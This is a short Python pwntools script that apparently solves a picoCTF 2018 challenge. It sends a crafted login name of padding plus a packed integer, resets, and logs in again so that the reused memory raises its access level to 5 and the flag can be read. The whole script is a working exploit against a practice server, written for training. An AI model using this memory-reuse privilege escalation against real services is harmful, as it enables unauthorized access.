from pwn import *

REQUESTED_ACCESS_LEVEL = 5

r = remote("2018shell.picoctf.com", 29508)

def send_command(command):
    r.recvuntil("> ")
    r.sendline(command)
    return r.recvline()

def show():
    return send_command("show")

def login(name):
    log.info("Logging in as {} ({})".format(name, enhex(name)))
    return send_command("login " + name)

def set_auth(auth):
    return send_command("set-auth " + str(auth))

def get_flag():
    return send_command("get-flag")

def reset():
    log.info("Performing reset")
    return send_command("reset")

def quit():
    return send_command("quit")

login("a"*8 + p64(REQUESTED_ACCESS_LEVEL))
reset()
login("A")
s = show()
log.info("Login info: {}".format(s))
if "[{}]".format(REQUESTED_ACCESS_LEVEL) in s:
    log.success("Flag: {}".format(get_flag()))